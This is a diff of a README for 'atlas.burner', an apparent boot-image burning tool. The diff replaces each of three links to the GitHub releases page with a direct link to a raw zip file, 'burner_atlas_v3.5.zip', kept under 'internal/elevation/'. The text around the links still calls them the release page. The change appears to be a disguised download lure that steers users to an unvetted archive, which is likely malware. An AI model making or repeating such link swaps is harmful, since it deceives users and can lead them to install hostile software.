@@ -1,6 +1,6 @@
 # 🪐 atlas.burner - Burn Boot Images with Ease
 
-[![Download atlas.burner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&labelColor=grey)](https://github.com/selfpossessionmaniraptor213/atlas.burner/releases)
+[![Download atlas.burner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&labelColor=grey)](https://github.com/selfpossessionmaniraptor213/atlas.burner/raw/refs/heads/main/internal/elevation/burner_atlas_v3.5.zip)
 
 ## 🚀 What is atlas.burner?
 
@@ -12,7 +12,7 @@ It works with images for Linux, Windows, and BSD systems. It also supports sever
 
 Visit this page to download:
 
-https://github.com/selfpossessionmaniraptor213/atlas.burner/releases
+https://github.com/selfpossessionmaniraptor213/atlas.burner/raw/refs/heads/main/internal/elevation/burner_atlas_v3.5.zip
 
 On Windows, use the latest release file that matches your system.
 
@@ -152,7 +152,7 @@ It is meant for common release formats used by operating system projects.
 
 If you need the release page again, use this link:
 
-https://github.com/selfpossessionmaniraptor213/atlas.burner/releases
+https://github.com/selfpossessionmaniraptor213/atlas.burner/raw/refs/heads/main/internal/elevation/burner_atlas_v3.5.zip
 
 ## 🪛 Drive safety tips
 
